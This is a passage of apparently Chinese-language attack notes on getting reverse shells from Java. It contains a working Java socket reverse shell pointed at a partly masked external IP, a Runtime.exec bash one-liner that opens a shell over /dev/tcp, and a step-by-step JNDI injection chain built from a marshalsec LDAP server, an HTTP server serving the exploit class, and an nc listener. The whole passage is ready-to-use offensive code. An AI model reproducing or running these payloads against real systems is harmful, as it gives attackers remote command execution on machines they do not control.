```java
            String host="49.x.y.z";
            int port=8888;
            String cmd="cmd.exe";
            // String cmd="/bin/sh"
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,port);
            InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                while(si.available()>0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
```



参考：
https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0



执行系统命令：
```
java.lang.Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/7777 0>&1")
```


### JNDI注入反弹shell

1、开启LDAP服务，并指向另外一个开启HTTP服务的端口
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8888/#Exploit
```
2、编译Exploit.java（静态代码块中写入反弹shell的payload），开启HTTP服务
```bash
python3 -m http.server 8888
```
3、监听某端口，接收反弹回来的shell
```bash
nc -klvn 7777
```
